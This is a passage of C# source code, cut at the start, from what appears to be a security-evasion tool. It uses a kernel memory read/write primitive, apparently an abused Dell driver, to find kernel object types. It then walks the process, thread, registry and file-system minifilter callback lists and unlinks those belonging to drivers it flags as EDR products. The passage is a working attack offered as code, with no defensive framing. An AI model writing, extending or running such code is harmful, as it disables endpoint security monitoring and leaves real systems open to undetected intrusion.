            long FuncAddress = 0;
            if (flag == 1)
            {
                FuncAddress = GetFuncAddress("ntoskrnl.exe", "NtDuplicateObject");
            }
            else if (flag == 2)
            {
                FuncAddress = GetFuncAddress("ntoskrnl.exe", "NtOpenThreadTokenEx");
            }
            if (FuncAddress == 0) return 0;

            IntPtr buffer = Marshal.AllocHGlobal(3);
            try
            {
                int count = 0;
                while (true)
                {
                    DriverWriteMemery(new IntPtr(FuncAddress), buffer, new UIntPtr(3));
                    byte[] values = new byte[3];
                    Marshal.Copy(buffer, values, 0, 3);

                    if (values[0] == 0x4c && values[1] == 0x8b && values[2] == 0x05)
                    {
                        break;
                    }
                    FuncAddress = FuncAddress + 1;
                    if (count == 300)
                    {
                        Console.WriteLine("PsProcessTyped or PsThreadType address not found.");
                        return 0;
                    }
                    count++;
                }

                ulong PsOffset = 0;
                IntPtr tmp = Marshal.AllocHGlobal(1);
                try
                {
                    for (int i = 6, k = 24; i > 2; i--, k = k - 8)
                    {
                        DriverWriteMemery(new IntPtr(FuncAddress + i), tmp, new UIntPtr(1));
                        byte value = Marshal.ReadByte(tmp);
                        PsOffset = ((ulong)value << k) + PsOffset;
                    }
                    if ((PsOffset & 0x00000000ff000000) == 0x00000000ff000000)
                        PsOffset = PsOffset | 0xffffffff00000000;

                    long PsProcessTypePtr = FuncAddress + 7 + (long)PsOffset;
                    IntPtr PsProcessTypeAddrPtr = Marshal.AllocHGlobal(8);
                    try
                    {
                        DriverWriteMemery(new IntPtr(PsProcessTypePtr), PsProcessTypeAddrPtr, new UIntPtr(8));
                        return Marshal.ReadInt64(PsProcessTypeAddrPtr);
                    }
                    finally
                    {
                        Marshal.FreeHGlobal(PsProcessTypeAddrPtr);
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(tmp);
                }
            }
            finally
            {
                Marshal.FreeHGlobal(buffer);
            }
        }

        // Clear ObRegisterCallbacks
        private static void ClearObRegisterCallbacks()
        {
            long PsProcessTypeAddr = GetPsProcessAndProcessTypeAddr(1);
            long PsThreadTypeAddr = GetPsProcessAndProcessTypeAddr(2);

            if (PsProcessTypeAddr != 0)
            {
                RemoveObRegisterCallbacks(PsProcessTypeAddr, 1);
            }
            else
            {
                Console.WriteLine("Failed to get PsProcessType address.");
            }

            if (PsThreadTypeAddr != 0)
            {
                RemoveObRegisterCallbacks(PsThreadTypeAddr, 2);
            }
            else
            {
                Console.WriteLine("Failed to get PsThreadType address.");
            }
        }

        // Remove ObRegisterCallbacks
        private static void RemoveObRegisterCallbacks(long PsProcessTypeAddr, int flag)
        {
            long CallbackListAddr = 0;
            if (dwMajor >= 10)
            {
                CallbackListAddr = PsProcessTypeAddr + 0xC8;
            }
            else if (dwMajor == 6)
            {
                if (dwMinorVersion == 3)
                {
                    CallbackListAddr = PsProcessTypeAddr + 0xC0;
                }
                else if (dwMinorVersion == 2)
                {
                    CallbackListAddr = PsProcessTypeAddr + 0xC0;
                }
                else if (dwMinorVersion == 1)
                {
                    CallbackListAddr = PsProcessTypeAddr + 0xC0;
                }
                else
                {
                    CallbackListAddr = PsProcessTypeAddr + 0xB8;
                }
            }
            else
            {
                Console.WriteLine("Unsupported operating system version.");
                return;
            }

            string CallbackType = flag == 1 ? "Process" : "Thread";
            Console.WriteLine("----------------------------------------------------");
            Console.WriteLine($"Register driver for Ob{CallbackType} callback: ");
            Console.WriteLine("----------------------------------------------------\n");

            IntPtr CallbackListHeadPtr = Marshal.AllocHGlobal(16);
            try
            {
                DriverWriteMemery(new IntPtr(CallbackListAddr), CallbackListHeadPtr, new UIntPtr(16));
                long Flink = Marshal.ReadInt64(CallbackListHeadPtr);
                long Blink = Marshal.ReadInt64(new IntPtr(CallbackListHeadPtr.ToInt64() + 8));

                if (Flink == CallbackListAddr)
                {
                    Console.WriteLine($"No Ob{CallbackType} callback registered.\n");
                    return;
                }

                IntPtr CurrentEntryPtr = Marshal.AllocHGlobal(16);
                try
                {
                    long CurrentEntry = Flink;
                    while (CurrentEntry != CallbackListAddr)
                    {
                        DriverWriteMemery(new IntPtr(CurrentEntry), CurrentEntryPtr, new UIntPtr(16));
                        long DriverCallBackFuncAddr = CurrentEntry + 0x28;
                        IntPtr DriverCallBackFuncAddrPtr = Marshal.AllocHGlobal(8);
                        try
                        {
                            DriverWriteMemery(new IntPtr(DriverCallBackFuncAddr), DriverCallBackFuncAddrPtr, new UIntPtr(8));
                            long DriverCallBackFunc = Marshal.ReadInt64(DriverCallBackFuncAddrPtr);
                            string DriverName = GetDriverName(DriverCallBackFunc);

                            if (DriverName != null)
                            {
                                Console.Write(DriverName);
                                if (IsEDR(DriverName))
                                {
                                    long PreEntry = CurrentEntry - 0x10;
                                    long NextEntry = Marshal.ReadInt64(CurrentEntryPtr);
                                    IntPtr PreEntryPtr = Marshal.AllocHGlobal(16);
                                    try
                                    {
                                        DriverWriteMemery(new IntPtr(PreEntry), PreEntryPtr, new UIntPtr(16));
                                        long PreFlink = Marshal.ReadInt64(PreEntryPtr);
                                        long PreBlink = Marshal.ReadInt64(new IntPtr(PreEntryPtr.ToInt64() + 8));

                                        if (PreFlink == CurrentEntry)
                                        {
                                            IntPtr NextEntryPtr = Marshal.AllocHGlobal(16);
                                            try
                                            {
                                                DriverWriteMemery(new IntPtr(NextEntry), NextEntryPtr, new UIntPtr(16));
                                                long NextFlink = Marshal.ReadInt64(NextEntryPtr);
                                                long NextBlink = Marshal.ReadInt64(new IntPtr(NextEntryPtr.ToInt64() + 8));

                                                DellWrite(new IntPtr(PreEntry), NextEntry);
                                                DellWrite(new IntPtr(NextEntry + 8), PreEntry);
                                                Console.WriteLine("\t[Clear]");
                                            }
                                            finally
                                            {
                                                Marshal.FreeHGlobal(NextEntryPtr);
                                            }
                                        }
                                    }
                                    finally
                                    {
                                        Marshal.FreeHGlobal(PreEntryPtr);
                                    }
                                }
                                else
                                {
                                    Console.WriteLine();
                                }
                            }
                            CurrentEntry = Marshal.ReadInt64(CurrentEntryPtr);
                        }
                        finally
                        {
                            Marshal.FreeHGlobal(DriverCallBackFuncAddrPtr);
                        }
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(CurrentEntryPtr);
                }
            }
            finally
            {
                Marshal.FreeHGlobal(CallbackListHeadPtr);
            }
            Console.WriteLine();
        }

        // Clear CmRegisterCallback
        private static void ClearCmRegisterCallback()
        {
            long CmCallbackListHeadAddress = GetFuncAddress("ntoskrnl.exe", "CmUnRegisterCallback") + 0x30;
            if (CmCallbackListHeadAddress == 0x30)
            {
                Console.WriteLine("Failed to get CmCallbackListHead address.");
                return;
            }

            Console.WriteLine("----------------------------------------------------");
            Console.WriteLine("Register driver for CmRegisterCallback callback: ");
            Console.WriteLine("----------------------------------------------------\n");

            IntPtr CallbackListHeadPtr = Marshal.AllocHGlobal(16);
            try
            {
                DriverWriteMemery(new IntPtr(CmCallbackListHeadAddress), CallbackListHeadPtr, new UIntPtr(16));
                long Flink = Marshal.ReadInt64(CallbackListHeadPtr);
                long Blink = Marshal.ReadInt64(new IntPtr(CallbackListHeadPtr.ToInt64() + 8));

                if (Flink == CmCallbackListHeadAddress)
                {
                    Console.WriteLine("No CmRegisterCallback callback registered.\n");
                    return;
                }

                IntPtr CurrentEntryPtr = Marshal.AllocHGlobal(16);
                try
                {
                    long CurrentEntry = Flink;
                    while (CurrentEntry != CmCallbackListHeadAddress)
                    {
                        DriverWriteMemery(new IntPtr(CurrentEntry), CurrentEntryPtr, new UIntPtr(16));
                        long DriverCallBackFuncAddr = CurrentEntry + 0x28;
                        IntPtr DriverCallBackFuncAddrPtr = Marshal.AllocHGlobal(8);
                        try
                        {
                            DriverWriteMemery(new IntPtr(DriverCallBackFuncAddr), DriverCallBackFuncAddrPtr, new UIntPtr(8));
                            long DriverCallBackFunc = Marshal.ReadInt64(DriverCallBackFuncAddrPtr);
                            string DriverName = GetDriverName(DriverCallBackFunc);

                            if (DriverName != null)
                            {
                                Console.Write(DriverName);
                                if (IsEDR(DriverName))
                                {
                                    long PreEntry = CurrentEntry - 0x10;
                                    long NextEntry = Marshal.ReadInt64(CurrentEntryPtr);
                                    IntPtr PreEntryPtr = Marshal.AllocHGlobal(16);
                                    try
                                    {
                                        DriverWriteMemery(new IntPtr(PreEntry), PreEntryPtr, new UIntPtr(16));
                                        long PreFlink = Marshal.ReadInt64(PreEntryPtr);
                                        long PreBlink = Marshal.ReadInt64(new IntPtr(PreEntryPtr.ToInt64() + 8));

                                        if (PreFlink == CurrentEntry)
                                        {
                                            IntPtr NextEntryPtr = Marshal.AllocHGlobal(16);
                                            try
                                            {
                                                DriverWriteMemery(new IntPtr(NextEntry), NextEntryPtr, new UIntPtr(16));
                                                long NextFlink = Marshal.ReadInt64(NextEntryPtr);
                                                long NextBlink = Marshal.ReadInt64(new IntPtr(NextEntryPtr.ToInt64() + 8));

                                                DellWrite(new IntPtr(PreEntry), NextEntry);
                                                DellWrite(new IntPtr(NextEntry + 8), PreEntry);
                                                Console.WriteLine("\t[Clear]");
                                            }
                                            finally
                                            {
                                                Marshal.FreeHGlobal(NextEntryPtr);
                                            }
                                        }
                                    }
                                    finally
                                    {
                                        Marshal.FreeHGlobal(PreEntryPtr);
                                    }
                                }
                                else
                                {
                                    Console.WriteLine();
                                }
                            }
                            CurrentEntry = Marshal.ReadInt64(CurrentEntryPtr);
                        }
                        finally
                        {
                            Marshal.FreeHGlobal(DriverCallBackFuncAddrPtr);
                        }
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(CurrentEntryPtr);
                }
            }
            finally
            {
                Marshal.FreeHGlobal(CallbackListHeadPtr);
            }
            Console.WriteLine();
        }

        // Clear MiniFilter callback
        private static void ClearMiniFilterCallback()
        {
            long FltMgrBase = GetModuleBase("FLTMGR.sys").ToInt64();
            if (FltMgrBase == 0)
            {
                Console.WriteLine("Failed to get FLTMGR.sys base address.");
                return;
            }

            long FltGlobalsOffset = 0;
            if (dwMajor >= 10)
            {
                FltGlobalsOffset = 0x11000;
            }
            else if (dwMajor == 6)
            {
                if (dwMinorVersion == 3)
                {
                    FltGlobalsOffset = 0x11000;
                }
                else if (dwMinorVersion == 2)
                {
                    FltGlobalsOffset = 0x11000;
                }
                else if (dwMinorVersion == 1)
                {
                    FltGlobalsOffset = 0x10000;
                }
                else
                {
                    FltGlobalsOffset = 0x10000;
                }
            }
            else
            {
                Console.WriteLine("Unsupported operating system version.");
                return;
            }

            long FltGlobals = FltMgrBase + FltGlobalsOffset;
            long FrameListHead = FltGlobals + 0x1F0;

            Console.WriteLine("----------------------------------------------------");
            Console.WriteLine("Register driver for MiniFilter callback: ");
            Console.WriteLine("----------------------------------------------------\n");

            IntPtr FrameListHeadPtr = Marshal.AllocHGlobal(16);
            try
            {
                DriverWriteMemery(new IntPtr(FrameListHead), FrameListHeadPtr, new UIntPtr(16));
                long Flink = Marshal.ReadInt64(FrameListHeadPtr);
                long Blink = Marshal.ReadInt64(new IntPtr(FrameListHeadPtr.ToInt64() + 8));

                if (Flink == FrameListHead)
                {
                    Console.WriteLine("No MiniFilter callback registered.\n");
                    return;
                }

                IntPtr CurrentEntryPtr = Marshal.AllocHGlobal(16);
                try
                {
                    long CurrentEntry = Flink;
                    while (CurrentEntry != FrameListHead)
                    {
                        DriverWriteMemery(new IntPtr(CurrentEntry), CurrentEntryPtr, new UIntPtr(16));
                        long DriverNameAddr = CurrentEntry + 0x58;
                        IntPtr DriverNameAddrPtr = Marshal.AllocHGlobal(8);
                        try
                        {
                            DriverWriteMemery(new IntPtr(DriverNameAddr), DriverNameAddrPtr, new UIntPtr(8));
                            long DriverNamePtr = Marshal.ReadInt64(DriverNameAddrPtr);
                            
                            if (DriverNamePtr != 0)
                            {
                                IntPtr DriverNameBuffer = Marshal.AllocHGlobal(256);
                                try
                                {
                                    DriverWriteMemery(new IntPtr(DriverNamePtr), DriverNameBuffer, new UIntPtr(256));
                                    string DriverName = Marshal.PtrToStringUni(DriverNameBuffer);
                                    
                                    if (DriverName != null)
                                    {
                                        Console.Write(DriverName);
                                        if (IsEDR(DriverName))
                                        {
                                            long PreEntry = CurrentEntry - 0x10;
                                            long NextEntry = Marshal.ReadInt64(CurrentEntryPtr);
                                            IntPtr PreEntryPtr = Marshal.AllocHGlobal(16);
                                            try
                                            {
                                                DriverWriteMemery(new IntPtr(PreEntry), PreEntryPtr, new UIntPtr(16));
                                                long PreFlink = Marshal.ReadInt64(PreEntryPtr);
                                                long PreBlink = Marshal.ReadInt64(new IntPtr(PreEntryPtr.ToInt64() + 8));

                                                if (PreFlink == CurrentEntry)
                                                {
                                                    IntPtr NextEntryPtr = Marshal.AllocHGlobal(16);
                                                    try
                                                    {
                                                        DriverWriteMemery(new IntPtr(NextEntry), NextEntryPtr, new UIntPtr(16));
                                                        long NextFlink = Marshal.ReadInt64(NextEntryPtr);
                                                        long NextBlink = Marshal.ReadInt64(new IntPtr(NextEntryPtr.ToInt64() + 8));

                                                        DellWrite(new IntPtr(PreEntry), NextEntry);
                                                        DellWrite(new IntPtr(NextEntry + 8), PreEntry);
                                                        Console.WriteLine("\t[Clear]");
                                                    }
                                                    finally
                                                    {
                                                        Marshal.FreeHGlobal(NextEntryPtr);
                                                    }
                                                }
                                            }
                                            finally
                                            {
                                                Marshal.FreeHGlobal(PreEntryPtr);
                                            }
                                        }
                                        else
                                        {
                                            Console.WriteLine();
                                        }
                                    }
                                }
                                finally
                                {
                                    Marshal.FreeHGlobal(DriverNameBuffer);
                                }
                            }
                            CurrentEntry = Marshal.ReadInt64(CurrentEntryPtr);
                        }
                        finally
                        {
                            Marshal.FreeHGlobal(DriverNameAddrPtr);
                        }
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(CurrentEntryPtr);
                }
            }
            finally
            {
                Marshal.FreeHGlobal(FrameListHeadPtr);
            }
            Console.WriteLine();
        }
    }
}